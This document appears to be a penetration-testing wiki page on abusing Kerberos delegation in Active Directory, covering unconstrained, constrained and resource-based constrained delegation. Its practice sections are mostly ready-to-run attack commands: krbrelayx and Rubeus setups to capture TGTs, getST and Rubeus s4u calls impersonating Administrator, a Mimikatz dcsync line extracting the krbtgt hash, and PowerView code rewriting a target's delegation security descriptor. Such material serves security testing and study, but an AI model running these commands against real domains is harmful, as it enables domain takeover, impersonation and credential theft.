# Delegations

## Theory

There are three types of Kerberos delegations

* **Unconstrained delegations \(KUD\)**: a service can impersonate users on any other service.
* **Constrained delegations \(KCD\)**: a service can impersonate users on a set of services
* **Resource based constrained delegations \(RBCD\)** : a set of services can impersonate users on a service

{% hint style="info" %}
With constrained and unconstrained delegations, the delegation attributes are set on the impersonating service whereas with RBCD, these attributes are set on the final resource or computer account itself.
{% endhint %}

Kerberos delegations can be abused by attackers to obtain valuable assets and sometimes even domain admin privileges.

![](../../../.gitbook/assets/kerberos_delegation.png)

## Practice

Some of the following parts allow to obtain modified or crafted Kerberos tickets. Once obtained, these tickets can be used with [Pass-the-Ticket](pass-the-ticket.md).

### Unconstrained Delegations

If an account \(user or computer\), with unconstrained delegations privileges, is compromised, an attacker must wait for a privileged user to authenticate on it \(or [force it](../mitm-and-coerced-authentications/)\) using Kerberos. The attacker service will receive a ST \(service ticket\) containing the user's TGT. That TGT will be used by the service as a proof of identity to obtain access to a target service as the target user.

{% hint style="info" %}
Unconstrained delegation abuses are usually combined with the [PrinterBug](../mitm-and-coerced-authentications/#ms-rprn-abuse-a-k-a-printer-bug) or [PrivExchange](../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange) to gain domain admin privileges.
{% endhint %}

{% tabs %}
{% tab title="From the attacker machine \(UNIX-like\)" %}
In order to abuse the unconstrained delegations privileges of an account, an attacker must add his machine to its SPNs \(i.e. of the compromised account\) and add a DNS entry for that name.

This allows targets \(e.g. Domain Controllers or Exchange servers\) to authenticate back to the attacker machine.

All of this can be done from UNIX-like systems with [addspn](https://github.com/dirkjanm/krbrelayx), [dnstool](https://github.com/dirkjanm/krbrelayx) and [krbrelayx](https://github.com/dirkjanm/krbrelayx) \(Python\).

{% hint style="info" %}
When attacking accounts able to delegate without constraints, there are two major scenarios

* **the account is a computer**: computers can edit their own SPNs via the `msDS-AdditionalDnsHostName` attribute. Since ticket received by krbrelayx will be encrypted with AES256 \(by default\), attackers will need to either supply the right AES256 key for the unconstrained delegations account \(`--aesKey` argument\) or the salt and password \(`--krbsalt` and `--krbpass` arguments\).
* **the account is a user**: users can't edit their own SPNs like computers do. Attackers need to control an [account operator](../privileged-groups.md) \(or any other user that has the needed privileges\) to edit the user's SPNs. Moreover, since tickets received by krbrelayx will be encrypted with RC4, attackers will need to either supply the NT hash \(`-hashes` argument\) or the salt and password \(`--krbsalt` and `--krbpass` arguments\)
{% endhint %}

{% hint style="success" %}
By default, the salt is always `DOMAINusername`.
{% endhint %}

```bash
# 1. Edit the compromised account's SPN via the msDS-AdditionalDnsHostName property (HOST for incoming SMB with PrinterBug, HTTP for incoming HTTP with PrivExchange)
addspn.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -s 'HOST/attacker.DOMAIN_FQDN' --additional 'DomainController'

# 2. Add a DNS entry for the attacker name set in the SPN added in the target machine account's SPNs
dnstool.py -u 'DOMAIN\CompromisedAccont' -p 'LMhash:NThash' -r 'attacker.DOMAIN_FQDN' -d 'attacker_IP' --action add 'DomainController'

# 3. Start the krbrelayx listener (the AES key is used by default by computer accounts to decrypt tickets)
krbrelayx.py --krbsalt 'DOMAINusername' --krbpass 'password'

# 4. Authentication coercion
# PrinterBug, PetitPotam, PrivExchange, ...
```

{% hint style="warning" %}
In case, for some reason, attacking a Domain Controller doesn't work \(i.e. error saying`Ciphertext integrity failed.`\) try to attack others \(if you're certain the credentials you supplied were correct\). Some replication and propagation issues could get in the way.
{% endhint %}

Once the krbrelayx listener is ready, an [authentication coercion attack](../mitm-and-coerced-authentications/) \(e.g. [PrinterBug](../mitm-and-coerced-authentications/#ms-rprn-abuse-a-k-a-printer-bug), [PrivExchange](../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange)\) can be operated. The listener will then receive a Kerberos authentication, hence a ST, containing a TGT.
{% endtab %}

{% tab title="From the compromised computer \(Windows\)" %}
Once the KUD capable host is compromised, [Rubeus](https://github.com/GhostPack/Rubeus) can be used \(on the compromised host\) as a listener to wait for a user to authenticate, the ST to show up and to extract the TGT it contains.

```bash
Rubeus.exe monitor /interval:5
```

Once the monitor is ready, a [forced authentication attack](../mitm-and-coerced-authentications/) \(e.g. [PrinterBug](../mitm-and-coerced-authentications/#ms-rprn-abuse-a-k-a-printer-bug), [PrivExchange](../mitm-and-coerced-authentications/#pushsubscription-abuse-a-k-a-privexchange)\) can be operated. Rubeus will then receive an authentication \(hence a ST, containing a TGT\). The TGT can be used to request a ST for another service.

```bash
Rubeus.exe asktgs /ticket:$base64_extracted_TGT /service:$target_SPN /ptt
```

Once the ticket is injected, it can natively be used when accessing a service, for example with [Mimikatz](https://github.com/gentilkiwi/mimikatz) to extract the `krbtgt` hash.

```bash
lsadump::dcsync /dc:$DomainController /domain:$DOMAIN /user:krbtgt
```
{% endtab %}
{% endtabs %}

### Constrained Delegations

If a service account, configured with constrained delegation to another service, is compromised, an attacker can impersonate any user \(e.g. domain admin\) in the environment to access the second service.

* If the service is configured with constrained delegation **without protocol transition**, then it works similarly to unconstrained delegation. The attacker controlled service needs to receive a user's ST in order to use the embedded TGT as an identity proof. "Without protocol transition" means the Kerberos authentication protocol needs to be used all the way.
* If the service is configured with constrained delegation **with protocol transition** then it doesn't need that user's ST. It can obtain it with a S4U2Self request and then use it with a S4U2Proxy request. The identity proof can either be a password, an NT hash or an AES key.

Once the final "impersonating" ticket is obtained, it can be used with [Pass-the-Ticket](pass-the-ticket.md) to access the target service.

{% tabs %}
{% tab title="UNIX-like" %}
The [Impacket](https://github.com/SecureAuthCorp/impacket) script [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) \(Python\) can perform all the necessary steps to obtain the final "impersonating" ST \(in this case, "Administrator" is impersonated/delegated account but it can be any user in the environment\).

The input credentials are those of the compromised service account configured with constrained delegations.

```bash
# with an NT hash
getST.py -spn $Target_SPN -impersonate Administrator -dc-ip $Domain_controller -hashes :$Controlled_service_NThash $Domain/$Controlled_service_account

# with an AES (128 or 256 bits) key
getST.py -spn $Target_SPN -impersonate Administrator -dc-ip $Domain_controller -aesKey $Controlled_service_AES_key $Domain/$Controlled_service_account
```

The SPN \(ServicePrincipalName\) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations \(more info on [adsecurity.org](https://adsecurity.org/?page_id=183)\).

{% hint style="warning" %}
In [some cases](delegations.md#theory), the delegation will not work. Depending on the context, the [bronze bit ](forged-tickets.md#bronze-bit-cve-2020-17049)vulnerability \(CVE-2020-17049\) can be used with the `-force-forwardable` option to try to bypass restrictions.
{% endhint %}
{% endtab %}

{% tab title="Windows" %}
[Rubeus ](https://github.com/GhostPack/Rubeus)can be used to request the delegation TGT and the "impersonation ST".

```bash
# Request the TGT
Rubeus.exe tgtdeleg

# Request the ST and inject it for pass-the-ticket
Rubeus.exe s4u /ticket:$base64_extracted_TGT /impersonateuser:Administrator /domain:$DOMAIN /msdsspn:$Target_SPN /dc:$DomainController /ptt
```

Once the ticket is injected, it can natively be used when accessing the service \(see [pass-the-ticket](pass-the-ticket.md)\).
{% endtab %}
{% endtabs %}

### Resource Based Constrained Delegations \(RBCD\)

If an account, having the capability to edit the `msDS-AllowedToActOnBehalfOfOtherIdentity` security descriptor of another object \(e.g. the `GenericWrite` ACE, see [Abusing ACLs](../access-control-entries/)\), is compromised, an attacker can use it populate that attribute, hence configuring that object for RBCD.

Then, in order to abuse this, the attacker has to control the computer account the object's attribute has been populated with.

In this situation, an attacker can obtain admin access to the target resource \(the object configured for RBCD in the first step\).

1. Control a computer account \(e.g. create a computer account by leveraging the `MachineAccountQuota` setting\)
2. Populate the `msDS-AllowedToActOnBehalfOfOtherIdentity` security descriptor of another object with the controlled machine account as value, using the credentials of a domain user that has the capability to populate attributes on the target object \(e.g. `GenericWrite`\).
3. Using the computer account credentials, operate S4U2Self and S4U2Proxy requests, just like constrained delegation with protocol transition.

{% tabs %}
{% tab title="UNIX-like" %}
**1 - Check the value** 🔎 **& Create the computer account** ⚒\*\*\*\*

Check the [MachineAccountQuota](../domain-settings/machineaccountquota.md) page

**2 - Edit the target's security descriptor** ✏ ****

The [rbcd-attack](https://github.com/tothi/rbcd-attack) script \(Python\) can be used to modify the delegation rights \(populate the target's `msDS-AllowedToActOnBehalfOfOtherIdentity` security descriptor\), using the credentials of a domain user. The [rbcd permissions](https://github.com/NinjaStyle82/rbcd_permissions) script \(Python\) is an alternative to rbcd-attack that can also do [pass-the-hash](../ntlm/pass-the-hash.md), [pass-the-ticket](pass-the-ticket.md), and operate cleanup of the security descriptor.

```bash
rbcd-attack -f 'SHUTDOWN' -t $Target -dc-ip $DomainController 'DOMAIN\anonymous:anonymous'

# Attack (example with user/password)
rbcd-permissions -c 'CN=SHUTDOWN,OU=Computers,DC=DOMAIN,DC=LOCAL' -t 'CN=TARGET,OU=Computers,DC=DOMAIN,DC=LOCAL' -d $DOMAIN_FQDN -u $USER -p $PASSWORD -l $LDAPSERVER

# Cleanup
rbcd-permissions --cleanup -c 'CN=SHUTDOWN,OU=Computers,DC=DOMAIN,DC=LOCAL' -t 'CN=TARGET,OU=Computers,DC=DOMAIN,DC=LOCAL' -d $DOMAIN_FQDN -u $USER -p $PASSWORD -l $LDAPSERVER
```

{% hint style="success" %}
Testers can use [ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) to set the delegation rights with the `--delegate-access` option \(see [NTLM relay](../ntlm/relay.md)\) instead of using [rbcd-attack](https://github.com/tothi/rbcd-attack) or [rbcd-permissions](https://github.com/NinjaStyle82/rbcd_permissions)
{% endhint %}

**3 - Obtain a ticket** 🎫 ****

Once the security descriptor has been modified, the [Impacket](https://github.com/SecureAuthCorp/impacket) script [getST](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py) \(Python\) can then perform all the necessary steps to obtain the final "impersonating" ST \(in this case, "Administrator" is impersonated but it can be any user in the environment\).

```bash
getST.py -spn $target_SPN -impersonate Administrator -dc-ip $DomainController 'DOMAIN/SHUTDOWN$:SomePassword'
```

The SPN \(ServicePrincipalName\) set will have an impact on what services will be reachable. For instance, `cifs/target.domain` or `host/target.domain` will allow most remote dumping operations \(more info on [adsecurity.org](https://adsecurity.org/?page_id=183)\).

{% hint style="warning" %}
In [some cases](delegations.md#theory), the delegation will not work. Depending on the context, the [bronze bit ](forged-tickets.md#bronze-bit-cve-2020-17049)vulnerability \(CVE-2020-17049\) can be used with the `-force-forwardable` option to try to bypass restrictions.
{% endhint %}

**4 - Pass-the-ticket** 🛂 ****

Once the ticket is obtained, it can be used with [pass-the-ticket](pass-the-ticket.md).
{% endtab %}

{% tab title="Windows" %}
In order to run the following commands and tools as other users, testers can check the [user impersonation](../credentials/impersonation.md) part.

**1 - Check the value** 🔎 **& Create the computer account** ⚒\*\*\*\*

Check the [MachineAccountQuota](../domain-settings/machineaccountquota.md) page

**2 - Edit the target's security descriptor** ✏ ****

The [PowerShell ActiveDirectory module](https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps)'s cmdlets Set-ADComputer and Get-ADComputer can be used to write and read the attributed of an object \(in this case, to modify the delegation rights\).

```bash
# Populate the msDS-AllowedToActOnBehalfOfOtherIdentity
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount 'PENTEST01$'

# Read the attribute
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount
```

PowerSploit's [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) module is an alternative that can be used to edit the attribute \([source](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html?highlight=genericall#id31)\).

```bash
# Obtain the SID of the controlled computer account
$ComputerSid = Get-DomainComputer 'PENTEST01' -Properties objectsid | Select -Expand objectsid

# Build a generic ACE with the attacker-added computer SID as the pricipal, and get the binary bytes for the new DACL/ACE
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# set SD in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the target comptuer account
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

**3 - Obtain a ticket** 🎫 ****

[Rubeus](https://github.com/GhostPack/Rubeus) can then be used to request the "impersonation ST" and inject it for later use.

```bash
Rubeus.exe s4u /user:SHUTDOWN$ /rc4:$NThash /impersonateuser:Administrator /msdsspn:$Target_SPN /ptt
```

The NT hash can be computed as follows.

```bash
Rubeus.exe hash /password:$password
```

**4 - Pass-the-ticket** 🛂 ****

Once the ticket is injected, it can natively be used when accessing the service \(see [pass-the-ticket](pass-the-ticket.md)\).
{% endtab %}
{% endtabs %}

## References

{% embed url="https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/" caption="" %}

{% embed url="https://blog.stealthbits.com/unconstrained-delegation-permissions/" caption="" %}

{% embed url="https://blog.stealthbits.com/constrained-delegation-abuse-abusing-constrained-delegation-to-achieve-elevated-access/" caption="" %}

{% embed url="https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/" caption="" %}

{% embed url="https://exploit.ph/user-constrained-delegation.html" %}

{% embed url="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" caption="" %}

{% embed url="https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/" %}

